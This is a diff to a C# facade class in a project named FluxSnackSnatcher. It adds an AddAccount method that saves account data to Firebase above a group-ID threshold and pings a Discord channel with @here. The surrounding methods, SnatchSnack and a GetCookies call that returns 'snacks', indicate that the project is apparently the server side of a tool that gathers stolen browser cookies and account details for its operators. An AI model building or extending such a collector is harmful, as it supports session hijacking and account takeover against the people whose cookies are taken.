@@ -1,5 +1,6 @@
 ﻿using FluxSnackSnatcher.Models;
 using FluxSnackSnatcher.Services;
+using FluxSnackSnatcher.Settings;
 using System.Text.RegularExpressions;
 
 namespace FluxSnackSnatcher.Facades
@@ -8,11 +9,13 @@ namespace FluxSnackSnatcher.Facades
     {
         private readonly IFirebaseService _firebaseService;
         private readonly IDiscordService _discordService;
+        private readonly ApiSettings _settings;
 
-        public SnatcherFacade(IFirebaseService firebaseService, IDiscordService discordService)
+        public SnatcherFacade(IFirebaseService firebaseService, IDiscordService discordService, ApiSettings apiSettings)
         {
             _firebaseService = firebaseService;
             _discordService = discordService;
+            _settings = apiSettings;
         }
 
         public async Task<string> SnatchSnack(string? snacks, string? url, string? account)
@@ -67,6 +70,16 @@ namespace FluxSnackSnatcher.Facades
             var snacks = await _firebaseService.GetCookies();
 
             return snacks;
+        }
+
+        public async Task AddAccount(AccountData account)
+        {
+            if (account.GroupId >= _settings.MinimumGroupId)
+            {
+                var response = await _firebaseService.SetAccount(account);
+
+                await _discordService.SendMessage($"```{response}```\n@here");
+            }
         }
     }
 }
